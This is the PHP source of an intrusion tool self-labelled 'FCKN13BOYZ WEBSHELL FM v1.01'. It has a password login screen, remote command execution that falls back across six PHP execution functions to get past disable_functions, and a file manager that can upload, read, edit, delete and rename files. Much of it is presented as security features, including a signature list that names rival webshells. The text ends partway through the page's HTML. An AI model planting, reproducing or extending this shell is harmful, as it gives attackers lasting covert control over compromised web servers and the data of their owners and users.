<?php
session_start();
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Konfigurasi keamanan yang lebih kuat
define('SALT', 'fckn13boyz_s3cur3_s4lt_2026');
define('MAX_LOGIN_ATTEMPTS', 5);
define('LOCKOUT_TIME', 900); // 15 menit dalam detik

// ========== ANTI-MALWARE / ANTI-BADAI / ANTI-MUTINGBELIUNG LAYER ==========
// Layer proteksi tambahan (tidak mengubah logika asli)

// 1. Anti-Badai: Deteksi request flood / DDoS ringan per IP
function antiBadai() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $key = 'badai_' . md5($ip);
    $now = time();
    if (!isset($_SESSION[$key])) {
        $_SESSION[$key] = ['count' => 1, 'start' => $now];
        return true;
    }
    // reset window tiap 10 detik
    if ($now - $_SESSION[$key]['start'] > 10) {
        $_SESSION[$key] = ['count' => 1, 'start' => $now];
        return true;
    }
    $_SESSION[$key]['count']++;
    // max 60 request / 10 detik
    if ($_SESSION[$key]['count'] > 60) {
        http_response_code(429);
        logActivity("Anti-Badai triggered: flood from IP $ip");
        die('<!DOCTYPE html><html><body style="background:#0a0000;color:#ff3333;font-family:monospace;text-align:center;padding:80px;"><h1>⚡ BADAI TERDETEKSI ⚡</h1><p>Request flood terdeteksi. Silakan tunggu.</p></body></html>');
    }
    return true;
}

// 2. Anti-Mutingbeliung: Sanitasi input global (anti XSS / injection storm)
function antiMutingbeliung($data) {
    if (is_array($data)) {
        return array_map('antiMutingbeliung', $data);
    }
    if (is_string($data)) {
        // blokir pola injeksi berbahaya
        $patterns = [
            '/<script[\s\S]*?<\/script>/i',
            '/on\w+\s*=\s*["\']?[^"\'>]+/i',
            '/javascript\s*:/i',
            '/union\s+select/i',
            '/\x00/',
        ];
        foreach ($patterns as $p) {
            if (preg_match($p, $data)) {
                logActivity("Anti-Mutingbeliung blocked pattern: " . substr($data, 0, 100));
                die('<!DOCTYPE html><html><body style="background:#0a0000;color:#ff3333;font-family:monospace;text-align:center;padding:80px;"><h1>🌪️ MUTINGBELIUNG TERDETEKSI 🌪️</h1><p>Input berbahaya diblokir.</p></body></html>');
            }
        }
    }
    return $data;
}

// 3. Anti-Malware: Scan pola malware pada input file / upload
function antiMalwareScan($filename, $content = '') {
    $malwareSigs = [
        'eval(base64_decode',
        'eval(gzinflate',
        'eval(gzuncompress',
        'eval(str_rot13',
        'assert($_',
        'preg_replace("/.*/e"',
        'shell_exec(',
        'passthru(',
        'proc_open(',
        'popen(',
        'system($_',
        'c99shell',
        'r57shell',
        'WSOsetcookie',
        'FilesMan',
        'b374k',
    ];
    $haystack = strtolower($filename . ' ' . $content);
    foreach ($malwareSigs as $sig) {
        if (strpos($haystack, strtolower($sig)) !== false) {
            logActivity("Anti-Malware blocked: signature '$sig' in $filename");
            return false;
        }
    }
    return true;
}

// 4. Anti-Tamper: Cek integritas session
function antiTamper() {
    if (isset($_SESSION['__sig']) && isset($_SESSION['authenticated'])) {
        $expected = hash_hmac('sha256', session_id() . '|' . SALT, SALT);
        if ($_SESSION['__sig'] !== $expected) {
            logActivity("Anti-Tamper: session signature mismatch");
            session_destroy();
            return false;
        }
    }
    return true;
}

// 5. Security headers
function sendSecurityHeaders() {
    header('X-Frame-Options: DENY');
    header('X-Content-Type-Options: nosniff');
    header('X-XSS-Protection: 1; mode=block');
    header('Referrer-Policy: no-referrer');
    header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
}

sendSecurityHeaders();
antiBadai();
antiTamper();
$_GET  = antiMutingbeliung($_GET);
$_POST = antiMutingbeliung($_POST);

// ========== AKHIR LAYER PROTEKSI TAMBAHAN ==========

// Hash password yang diberikan
$kataSandiBenar = '$2a$12$cL6ffP574FDEaRkdojHEROTxSpX3Bmy6dy0o2XAS/x/hNeUDqnKJm';

// Fungsi untuk logging aktivitas
function logActivity($message) {
    $logFile = 'security.log';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $logMessage = "[$timestamp] IP: $ip | User-Agent: $userAgent | $message\n";
    @file_put_contents($logFile, $logMessage, FILE_APPEND);
}

// Fungsi untuk memeriksa login attempts
function checkLoginAttempts() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $attempts = $_SESSION['login_attempts'][$ip] ?? ['count' => 0, 'time' => time()];
    
    if ($attempts['count'] >= MAX_LOGIN_ATTEMPTS) {
        $timeLeft = LOCKOUT_TIME - (time() - $attempts['time']);
        if ($timeLeft > 0) {
            return false;
        } else {
            unset($_SESSION['login_attempts'][$ip]);
            return true;
        }
    }
    return true;
}

// Fungsi untuk mencatat login attempt
function recordLoginAttempt($success) {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!isset($_SESSION['login_attempts'][$ip])) {
        $_SESSION['login_attempts'][$ip] = ['count' => 0, 'time' => time()];
    }
    
    if (!$success) {
        $_SESSION['login_attempts'][$ip]['count']++;
        if ($_SESSION['login_attempts'][$ip]['count'] >= MAX_LOGIN_ATTEMPTS) {
            $_SESSION['login_attempts'][$ip]['time'] = time();
            logActivity("Login locked for IP: $ip due to too many attempts");
        }
    } else {
        unset($_SESSION['login_attempts'][$ip]);
    }
}

// Validasi session dengan multiple factor
function validateSession() {
    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
        return false;
    }
    
    if (isset($_SESSION['login_ip']) && $_SESSION['login_ip'] !== $_SERVER['REMOTE_ADDR']) {
        logActivity("Session IP mismatch for user: " . ($_SESSION['username'] ?? 'unknown'));
        session_destroy();
        return false;
    }
    
    if (isset($_SESSION['user_agent']) && $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        logActivity("Session User-Agent mismatch for user: " . ($_SESSION['username'] ?? 'unknown'));
        session_destroy();
        return false;
    }
    
    if (!isset($_SESSION['created']) || (time() - $_SESSION['created']) > 3600) {
        session_regenerate_id(true);
        $_SESSION['created'] = time();
    }
    
    return true;
}

// Fungsi untuk menjalankan command dengan berbagai metode
function executeCommand($cmd) {
    $output = '';
    $return_var = 0;
    
    // Cek berbagai metode yang tersedia
    $methods = [];
    
    // Metode 1: exec()
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'exec';
    }
    
    // Metode 2: shell_exec()
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'shell_exec';
    }
    
    // Metode 3: system()
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'system';
    }
    
    // Metode 4: passthru()
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'passthru';
    }
    
    // Metode 5: proc_open()
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'proc_open';
    }
    
    // Metode 6: popen()
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        $methods[] = 'popen';
    }
    
    // Coba jalankan dengan metode yang tersedia
    foreach ($methods as $method) {
        try {
            switch ($method) {
                case 'exec':
                    exec($cmd . ' 2>&1', $output, $return_var);
                    $output = implode("\n", $output);
                    break;
                    
                case 'shell_exec':
                    $output = shell_exec($cmd . ' 2>&1');
                    break;
                    
                case 'system':
                    ob_start();
                    system($cmd . ' 2>&1', $return_var);
                    $output = ob_get_clean();
                    break;
                    
                case 'passthru':
                    ob_start();
                    passthru($cmd . ' 2>&1', $return_var);
                    $output = ob_get_clean();
                    break;
                    
                case 'proc_open':
                    $descriptorspec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $process = proc_open($cmd, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        $output = stream_get_contents($pipes[1]);
                        $error = stream_get_contents($pipes[2]);
                        fclose($pipes[0]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        if (!empty($error)) {
                            $output .= "\n" . $error;
                        }
                    }
                    break;
                    
                case 'popen':
                    $handle = popen($cmd . ' 2>&1', 'r');
                    if ($handle) {
                        $output = '';
                        while (!feof($handle)) {
                            $output .= fread($handle, 4096);
                        }
                        pclose($handle);
                    }
                    break;
            }
            
            // Jika berhasil mendapatkan output
            if ($output !== null && $output !== '') {
                return [
                    'success' => true,
                    'output' => trim($output),
                    'method' => $method
                ];
            }
            
        } catch (Exception $e) {
            continue;
        }
    }
    
    // Jika semua metode gagal
    return [
        'success' => false,
        'output' => "No execution method available. Tried: " . implode(', ', $methods),
        'method' => 'none'
    ];
}

// Authentikasi
if (!validateSession()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== ($_SESSION['csrf_token'] ?? '')) {
            logActivity("CSRF token validation failed");
            $error = 'Invalid request!';
        } elseif (!checkLoginAttempts()) {
            $timeLeft = LOCKOUT_TIME - (time() - ($_SESSION['login_attempts'][$_SERVER['REMOTE_ADDR']]['time'] ?? 0));
            $error = "Too many failed attempts. Please wait " . ceil($timeLeft / 60) . " minutes.";
            logActivity("Login blocked: Too many attempts from IP: " . $_SERVER['REMOTE_ADDR']);
        } else {
            $password = $_POST['password'] ?? '';
            
            if (password_verify($password, $kataSandiBenar)) {
                $_SESSION['authenticated'] = true;
                $_SESSION['login_ip'] = $_SERVER['REMOTE_ADDR'];
                $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
                $_SESSION['created'] = time();
                $_SESSION['username'] = 'admin';
                // Anti-Tamper signature
                $_SESSION['__sig'] = hash_hmac('sha256', session_id() . '|' . SALT, SALT);
                
                recordLoginAttempt(true);
                logActivity("Successful login from IP: " . $_SERVER['REMOTE_ADDR']);
                
                header('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                recordLoginAttempt(false);
                logActivity("Failed login attempt from IP: " . $_SERVER['REMOTE_ADDR']);
                $error = 'WHAT THE FUCK ARE U DOING DUDE ?';
            }
        }
    }
    
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FCKN13BOYZ</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
        <link rel="icon" href="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg">
        <style>
            body {
                background: linear-gradient(135deg, rgba(10,0,0,0.92) 0%, rgba(40,0,0,0.92) 100%),
                            url('https://i.pinimg.com/736x/20/9f/94/209f94a0cb7458133da685d0a64b76b6.jpg') center/cover no-repeat fixed;
                color: #fff !important;
                min-height: 100vh;
            }
            .login-container {
                background: rgba(30, 0, 0, 0.55);
                backdrop-filter: blur(14px);
                border-radius: 20px;
                padding: 40px;
                border: 1px solid rgba(255, 0, 0, 0.35);
                box-shadow: 0 20px 60px rgba(255, 0, 0, 0.25), inset 0 0 40px rgba(255,0,0,0.05);
            }
            .login-logo {
                width: 400px;
                height: 110px;
                object-fit: contain;
                filter: drop-shadow(0 0 20px rgba(255,0,0,0.7));
                animation: pulseGlow 2.5s ease-in-out infinite;
            }
            @keyframes pulseGlow {
                0%,100% { filter: drop-shadow(0 0 15px rgba(255,0,0,0.5)); }
                50%     { filter: drop-shadow(0 0 30px rgba(255,0,0,0.95)); }
            }
            .login-title {
                font-size: 3rem;
                font-weight: 700;
                letter-spacing: 8px;
                text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
                background: linear-gradient(45deg, #ff0000, #ff4d4d, #cc0000);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            .login-subtitle {
                color: rgba(255, 60, 60, 0.85);
                font-size: 1rem;
                letter-spacing: 4px;
                text-transform: uppercase;
            }
            .form-control {
                background: rgba(60, 0, 0, 0.55) !important;
                border: 1px solid rgba(255, 0, 0, 0.4) !important;
                color: #fff !important;
                padding: 15px !important;
            }
            .form-control::placeholder { color: rgba(255,120,120,0.55) !important; }
            .form-control:focus {
                border-color: #ff0000 !important;
                box-shadow: 0 0 30px rgba(255, 0, 0, 0.35) !important;
                background: rgba(80, 0, 0, 0.65) !important;
            }
            .btn-login {
                padding: 15px 40px;
                font-weight: 600;
                letter-spacing: 3px;
                background: linear-gradient(45deg, #ff0000, #a30000);
                border: none;
                transition: all 0.3s ease;
                text-transform: uppercase;
                box-shadow: 0 8px 25px rgba(255,0,0,0.35);
            }
            .btn-login:hover {
                transform: scale(1.02);
                box-shadow: 0 10px 40px rgba(255, 0, 0, 0.6);
                background: linear-gradient(45deg, #ff1a1a, #cc0000);
            }
            .security-badge {
                position: fixed;
                bottom: 20px;
                right: 20px;
                background: rgba(40, 0, 0, 0.65);
                padding: 5px 15px;
                border-radius: 20px;
                font-size: 10px;
                color: rgba(255, 80, 80, 0.85);
                letter-spacing: 1px;
                border: 1px solid rgba(255, 0, 0, 0.3);
                backdrop-filter: blur(6px);
            }
            .logo-corner {
                position: fixed;
                top: 18px;
                left: 18px;
                width: 46px;
                height: 46px;
                object-fit: contain;
                filter: drop-shadow(0 0 10px rgba(255,0,0,0.6));
                z-index: 999;
            }
        </style>
    </head>
    <body class="d-flex justify-content-center align-items-center">
        <img src="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg" alt="logo" class="logo-corner">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 col-lg-5">
                    <div class="login-container">
                        <div class="text-center mb-4">
                            <img src="https://s15.gifyu.com/images/bWSlU.png" alt="FCKN13BOYZ Logo" class="login-logo mb-3">
                            <h1 class="login-title">WAKE</h1>
                            <p class="login-subtitle">AND MAKE BOYZ</p>
                        </div>
                        
                        <?php if (isset($error)): ?>
                            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                                <i class="bi bi-exclamation-triangle"></i> <?php echo htmlspecialchars($error); ?>
                                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <div class="mb-4">
                                <label for="password" class="form-label text-light-emphasis">Password</label>
                                <input type="password" 
                                       name="password" 
                                       id="password" 
                                       class="form-control" 
                                       placeholder="Enter secure password" 
                                       required 
                                       autocomplete="current-password">
                            </div>
                            <button type="submit" class="btn btn-danger w-100 btn-login">
                                <i class="bi bi-lock"></i> Authenticate
                            </button>
                        </form>
                        
                        <div class="mt-3 text-center">
                            <small class="text-muted">
                                <i class="bi bi-shield-check"></i> Secure connection
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="security-badge">
            <i class="bi bi-shield-lock-fill"></i> FCKN13BOYZ WEBSHELL FM v1.01
        </div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

// ========== MAIN APPLICATION (Authenticated) ==========
$baseDir = realpath(getcwd());
$path = isset($_GET['path']) ? realpath($_GET['path']) : $baseDir;

if ($path === false || !is_dir($path)) {
    $path = $baseDir;
}

// Fungsi untuk membersihkan path
function sanitizePath($path) {
    $path = str_replace(['..', '\\'], '', $path);
    return $path;
}

// Fungsi untuk mendownload file dengan keamanan
function downloadFile($file) {
    $file = sanitizePath($file);
    if (file_exists($file) && is_file($file)) {
        $dangerousExtensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'phps', 'asp', 'aspx', 'jsp', 'cgi'];
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if (in_array($ext, $dangerousExtensions)) {
            logActivity("Attempted to download dangerous file: $file");
            return false;
        }
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        logActivity("File downloaded: $file");
        exit;
    }
    return false;
}

// Fungsi untuk mendapatkan permissions
function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';
    
    switch ($perms & 0xF000) {
        case 0xC000: $info = 's'; break;
        case 0xA000: $info = 'l'; break;
        case 0x8000: $info = '-'; break;
        case 0x6000: $info = 'b'; break;
        case 0x4000: $info = 'd'; break;
        case 0x2000: $info = 'c'; break;
        case 0x1000: $info = 'p'; break;
        default: $info = 'u';
    }
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

// Handler untuk download
if (isset($_GET['download'])) {
    if (downloadFile($_GET['download'])) {
        exit;
    }
}

// Handler untuk command execution - VERSI KUAT
$cmdResult = null;
$cmdMethod = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $cmdResult = "Security: CSRF token validation failed!";
    } else {
        $cmd = $_POST['cmd'];
        
        // Cek apakah perintah berbahaya
        $dangerousCommands = ['rm -rf', 'mkfs', 'dd if=', '> /dev', 'format'];
        foreach ($dangerousCommands as $dangerous) {
            if (stripos($cmd, $dangerous) !== false) {
                $cmdResult = "Command blocked for security reasons!";
                logActivity("Blocked dangerous command: $cmd");
                goto skip_execution;
            }
        }
        
        // Escape command untuk keamanan
        $cmd = escapeshellcmd($cmd);
        
        // Ubah direktori
        if (is_dir($path)) {
            chdir($path);
        }
        
        // Jalankan command dengan fungsi yang sudah diperkuat
        $result = executeCommand($cmd);
        
        if ($result['success']) {
            $cmdResult = $result['output'];
            $cmdMethod = $result['method'];
            logActivity("Command executed using {$result['method']}: $cmd");
        } else {
            $cmdResult = $result['output'];
        }
    }
    skip_execution:
}

// Handler untuk upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo "<div class='alert alert-danger mt-2'>Security: CSRF token validation failed!</div>";
    } elseif (isset($_FILES['file'])) {
        $fileName = basename($_FILES['file']['name']);
        if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fileName)) {
            $dangerousExtensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'phps', 'asp', 'aspx', 'jsp', 'cgi'];
            $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            
            if (in_array($ext, $dangerousExtensions)) {
                echo "<div class='alert alert-danger mt-2'>File type not allowed for security reasons!</div>";
            } else {
                // Anti-Malware scan pada isi file sebelum upload
                $tmpContent = @file_get_contents($_FILES['file']['tmp_name']);
                if ($tmpContent !== false && !antiMalwareScan($fileName, $tmpContent)) {
                    echo "<div class='alert alert-danger mt-2'><i class='bi bi-shield-x'></i> File terdeteksi malware! Upload diblokir.</div>";
                } else {
                    $targetPath = $path . '/' . $fileName;
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
                        echo "<div class='alert alert-success mt-2'>File berhasil diupload!</div>";
                        logActivity("File uploaded: $fileName to $path");
                    } else {
                        echo "<div class='alert alert-danger mt-2'>Gagal mengupload file!</div>";
                    }
                }
            }
        } else {
            echo "<div class='alert alert-danger mt-2'>Nama file tidak valid!</div>";
        }
    }
}

// Handler untuk create file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_file') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo "<div class='alert alert-danger mt-2'>Security: CSRF token validation failed!</div>";
    } elseif (isset($_POST['name']) && preg_match('/^[a-zA-Z0-9_\-\.]+$/', $_POST['name'])) {
        $filePath = $path . '/' . $_POST['name'];
        if (file_put_contents($filePath, "") !== false) {
            echo "<div class='alert alert-success mt-2'>File berhasil dibuat!</div>";
            logActivity("File created: " . $_POST['name'] . " in $path");
        } else {
            echo "<div class='alert alert-danger mt-2'>Gagal membuat file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger mt-2'>Nama file tidak valid!</div>";
    }
}

// Handler untuk create folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_folder') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo "<div class='alert alert-danger mt-2'>Security: CSRF token validation failed!</div>";
    } elseif (isset($_POST['name']) && preg_match('/^[a-zA-Z0-9_\-]+$/', $_POST['name'])) {
        $folderPath = $path . '/' . $_POST['name'];
        if (mkdir($folderPath)) {
            echo "<div class='alert alert-success mt-2'>Folder berhasil dibuat!</div>";
            logActivity("Folder created: " . $_POST['name'] . " in $path");
        } else {
            echo "<div class='alert alert-danger mt-2'>Gagal membuat folder!</div>";
        }
    } else {
        echo "<div class='alert alert-danger mt-2'>Nama folder tidak valid!</div>";
    }
}

// Handler untuk delete, edit, rename (via AJAX)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'], $_POST['target'])) {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo json_encode(['status' => 'error', 'message' => 'Security: CSRF token validation failed!']);
        exit;
    }
    
    $action = $_POST['action'];
    $targetPath = $_POST['target'];
    
    switch ($action) {
        case 'delete':
            if (is_file($targetPath)) {
                if (unlink($targetPath)) {
                    echo json_encode(['status' => 'success', 'message' => 'File berhasil dihapus!']);
                    logActivity("File deleted: $targetPath");
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus file!']);
                }
            } elseif (is_dir($targetPath)) {
                if (rmdir($targetPath)) {
                    echo json_encode(['status' => 'success', 'message' => 'Folder berhasil dihapus!']);
                    logActivity("Folder deleted: $targetPath");
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus folder!']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Target tidak valid!']);
            }
            exit;
            
        case 'edit':
            if (isset($_POST['content'])) {
                $handle = fopen($targetPath, 'w');
                if ($handle) {
                    fwrite($handle, $_POST['content']);
                    fclose($handle);
                    echo json_encode(['status' => 'success', 'message' => 'File berhasil diedit!']);
                    logActivity("File edited: $targetPath");
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Tidak dapat membuka file untuk menulis!']);
                }
            } else {
                if (file_exists($targetPath)) {
                    $content = file_get_contents($targetPath);
                    echo json_encode(['status' => 'success', 'content' => $content]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'File tidak ditemukan!']);
                }
            }
            exit;
            
        case 'rename':
            if (isset($_POST['new_name'])) {
                $newPath = dirname($targetPath) . '/' . $_POST['new_name'];
                if (rename($targetPath, $newPath)) {
                    echo json_encode(['status' => 'success', 'message' => 'Berhasil mengganti nama!']);
                    logActivity("File renamed: $targetPath to $newPath");
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Gagal mengganti nama!']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Nama baru tidak diberikan!']);
            }
            exit;
    }
}

// Logout handler
if (isset($_GET['logout'])) {
    logActivity("User logged out");
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FCKN13BOYZ FM v1.01</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <link rel="icon" href="https://i.pinimg.com/736x/60/d2/07/60d207b84a3c31fcff2731de27ed1f44.jpg">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, rgba(10,0,0,0.88) 0%, rgba(35,0,0,0.92) 100%),
                        url('https://i.pinimg.com/736x/20/9f/94/209f94a0cb7458133da685d0a64b76b6.jpg') center/cover no-repeat fixed;
            color: #fff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(180deg, rgba(60,0,0,0.85) 0%, rgba(10,0,0,0.85) 100%);
            border-bottom: 2px solid #ff0000;
            padding: 20px 0;
            backdrop-filter: blur(8px);
            box-shadow: 0 4px 25px rgba(255,0,0,0.25);
        }
        .header-logo {
            width: 48px;
            height: 48px;
            object-fit: contain;
            filter: drop-shadow(0 0 12px rgba(255,0,0,0.85));
            margin-right: 12px;
            animation: pulseGlow 2.8s ease-in-out infinite;
        }
        @keyframes pulseGlow {
            0%,100% { filter: drop-shadow(0 0 8px rgba(255,0,0,0.5)); }
            50%     { filter: drop-shadow(0 0 20px rgba(255,0,0,0.95)); }
        }
        .file-manager {
            background: rgba(15, 0, 0, 0.72);
            border: 1px solid rgba(255, 0, 0, 0.35);
            border-radius: 10px;
            padding: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 10px 40px rgba(255,0,0,0.15), inset 0 0 30px rgba(255,0,0,0.04);
        }
        .table {
            color: #fff;
            border-color: #330000;
        }
        .table thead th {
            border-bottom: 2px solid #ff0000;
            color: #ff4444;
            background: rgba(60,0,0,0.4);
        }
        .table tbody tr {
            border-color: rgba(255,0,0,0.12);
        }
        .table tbody tr:hover {
            background: rgba(255, 0, 0, 0.1);
        }
        .btn-outline-danger {
            border-color: #ff0000;
            color: #ff3333;
        }
        .btn-outline-danger:hover {
            background: #ff0000;
            color: #fff;
        }
        .btn-outline-primary {
            border-color: #ff5555;
            color: #ff5555;
        }
        .btn-outline-primary:hover {
            background: #ff5555;
            color: #fff;
        }
        .btn-outline-success {
            border-color: #ff9999;
            color: #ff9999;
        }
        .btn-outline-success:hover {
            background: #ff9999;
            color: #000;
        }
        .btn-outline-warning {
            border-color: #ff7733;
            color: #ff7733;
        }
        .btn-outline-warning:hover {
            background: #ff7733;
            color: #000;
        }
        .shell-box {
            background: rgba(5, 0, 0, 0.9);
            border: 1px solid #660000;
            border-radius: 5px;
            padding: 10px;
            color: #ff5555;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            box-shadow: inset 0 0 20px rgba(255,0,0,0.08);
        }
        .shell-box pre {
            margin: 0;
            color: #ff6666;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .shell-method {
            color: #ffaa00;
            font-size: 11px;
        }
        .breadcrumb {
            background: transparent;
            padding: 0;
            margin: 0;
        }
        .breadcrumb-item a {
            color: #ff5555;
            text-decoration: none;
        }
        .breadcrumb-item a:hover {
            text-decoration: underline;
        }
        .breadcrumb-item.active {
            color: #fff;
        }
        .badge-danger-custom {
            background: #ff0000;
            color: #fff;
        }
        .modal-content {
            background: rgba(20, 0, 0, 0.96);
            color: #fff;
            border: 1px solid rgba(255,0,0,0.45);
            backdrop-filter: blur(12px);
        }
        .modal-header {
            border-bottom: 1px solid rgba(255,0,0,0.3);
        }
        .modal-footer {
            border-top: 1px solid rgba(255,0,0,0.3);
        }
        .form-control {
            background: rgba(40,0,0,0.7) !important;
            color: #fff !important;
            border-color: rgba(255,0,0,0.35) !important;
        }
        .form-control::placeholder { color: rgba(255,120,120,0.5) !important; }
        .form-control:focus {
            border-color: #ff0000 !important;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.35) !important;
            background: rgba(60,0,0,0.8) !important;
        }
        .btn-close {
            filter: invert(1);
        }
        .command-status {
            font-size: 11px;
            color: #ff7777;
        }
        .input-group-text {
            background: rgba(40,0,0,0.7) !important;
            color: #ff3333 !important;
            border-color: rgba(255,0,0,0.35) !important;
        }
        .security-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(40, 0, 0, 0.7);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 10px;
            color: rgba(255, 80, 80, 0.9);
            letter-spacing: 1px;
            border: 1px solid rgba(255, 0, 0, 0.35);
            backdrop-filter: blur(6px);
            z-index: 999;
        }
        .alert-danger {
            background: rgba(80,0,0,0.75);
            border-color: #ff0000;
            color: #fff;
        }
        .alert-success {
            background: rgba(60,30,0,0.7);
            border-color: #ff9933;
            color: #ffddaa;
        }
    </style>
</head>
<body>

<div class="header">
    <div class="container">
        <div class="d-flex justify-content-between align-items-center">
            <div class="d-flex align-items-center">
                <img src="https://s15.gifyu.com/images/bWSlU.png" alt="logo" class="header-logo">
                <div>
                    <h2 class="mb-0" style="color: #ff0000; font-weight: 700;">
                        <i class="bi bi-shield-fill"></i> FCKN13BOYZ
                    </h2>
                    <small class="text-muted">MY PRIDE NEVER BENDS</small>
